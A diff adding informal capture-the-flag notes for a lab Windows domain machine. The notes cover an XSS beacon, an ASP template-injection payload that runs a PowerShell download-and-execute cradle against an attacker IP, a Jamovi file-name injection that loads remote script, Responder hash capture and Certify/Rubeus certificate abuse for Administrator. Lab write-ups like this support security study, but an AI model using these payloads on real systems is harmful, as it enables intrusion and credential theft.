@@ -1,0 +1,76 @@
+i did a scan and got some ports open . on visiting 443 port we get error
+
+rustscan said a ==subdomain== www.something on visiting it we get a working web page
+
+the contact page seemed to be working so i ==intercepted== the request . It was first sending the request to save.asp
+
+then redirect it to verify.asp  . Interstingly it was not using  aspx and the header ==dont had X-Powered-By: ASP.NET==
+
+on running ==gobuster== with extension asp it told about text.asp. test.asp holds our all data that we send by contact form
+
+we tried ==js injection== ,alert("XSS"), it worked on visiting test.asp.
+
+now we tried to connect to our pc and we did a ==img injection==
+
+`<img src="https://10.10.14.10/aa" />` and listen on nc -lvnp 443
+
+> ### **==NOTE==**:- http will not work as page was on https so USE https
+
+we get connection. now we did ==ssti== on the contact form to get a shell
+
+```
+${{<%[%'"}}%\.
+these are all types of ssti. we will send them
+to find out bad charecters. like  send 
+${{<%[%'"}}% this the ${{<%[%'" this and stop when no error message come.
+
+<%= 7*7 %> we got 49
+
+<%= CreateObject("Wscript.Shell").exec("powershell IEX (New-Object Net.WebClient).downloadString('http://10.10.14.10/shell.ps1')").StdOut.ReadAll() %>
+we did this to get a shell
+```
+
+`https://github.com/tennc/webshell/blob/master/asp/webshell.asp` ->> ref link
+
+we were in a ==docker==
+
+so we did a chisel on port 1080 and got a webpage by adding ==proxycahins== ..
+
+it showed a webpage with internal ip .. i changed it to my ip and got hash on my ==reponder== and thus localadmins password
+
+we got access to smb and on share we found a file ==omv==.
+
+it means ==Jamovi== and on search we found a exploit that we can send paylaod from the column name and it will execute it
+
+to give us shell
+
+we will upload the same file via smb which had a recent timestamp with payload in it
+
+```
+there was a file Whatif.omv
+we did unzip Whatif.omv an got a josn file metadata.json .. in it we can cahnge the name to 
+ "name": "a<script src='http://10.10.14.10/sploit.js'></scrip>"
+ it point to sploit.js
+
+ which was
+ 
+require('child_process').exec("powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10:81/shell.ps1') ")
+ 
+ without <script> tag as the file was sploit.json
+ and we got shell on  main pc
+```
+
+on running winpeas it suggested something about ==spn ticket== so we ran certify and rubeus to get shell
+
+```
+.\certify.exe find /vulnerable /currentuser
+we got Web template 
+.\c.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:Administrator
+to get key 
+save both keys in same file
+then run command said by certify to change them in pfx
+then
+.\r.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+```
+
+get shell with ntlm password
